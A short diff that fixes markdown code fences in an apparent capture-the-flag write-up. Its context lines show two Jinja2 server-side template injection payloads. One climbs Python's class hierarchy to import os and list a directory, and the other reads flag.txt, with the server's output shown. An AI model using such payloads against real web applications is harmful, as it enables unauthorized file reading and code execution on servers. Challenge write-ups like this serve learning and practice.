@@ -41,7 +41,9 @@ after a lot of trial and error one of many solutions can be discovered …
    
    ```python
    {{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__.__import__('os').listdir('.')}}
+   ```
 
+   ```
    The ginger bread man says: 
     -------------------------------
    ( Hello, mighty ['bin', 'boot', )
@@ -58,7 +60,9 @@ after a lot of trial and error one of many solutions can be discovered …
 
    ```python
    {{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open'](''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__.__import__('os').path.join('.','flag.txt')).read()}}
+   ```
 
+   ```
    The ginger bread man says:
     --------------------------------
    ( Hello, mighty HV20{SST1_N0t_0N )
